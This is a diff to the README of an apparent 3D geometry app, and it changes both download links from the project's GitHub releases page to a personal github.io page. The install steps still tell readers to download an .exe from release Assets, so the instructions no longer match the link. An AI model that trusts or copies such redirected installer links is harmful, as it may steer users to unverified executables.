@@ -1,6 +1,6 @@
 # 📐 3d-geometry-lab-v2026 - Explore mathematical shapes in three dimensions
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/abdull9951/3d-geometry-lab-v2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://abdull9951.github.io)
 
 3D Geometry Lab v2026 provides a visual environment for students and hobbyists to explore complex mathematical concepts. The software uses WebGL technology to render high-quality 3D objects directly in your web browser. You can manipulate shapes, modify algebraic functions, and observe how different variables change the geometry in real-time. Hand-tracked controls offer an immersive way to rotate and inspect models without a mouse.
 
@@ -12,7 +12,7 @@ This application requires a modern desktop computer running Windows 10 or Window
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the project release page to find the current installer files: [https://github.com/abdull9951/3d-geometry-lab-v2026/releases](https://github.com/abdull9951/3d-geometry-lab-v2026/releases)
+1. Visit the project release page to find the current installer files: [https://abdull9951.github.io](https://abdull9951.github.io)
 2. Look for the file ending in .exe under the Assets section of the latest release.
 3. Click the filename to start the download.
 4. Locate the downloaded file in your browser's download folder.
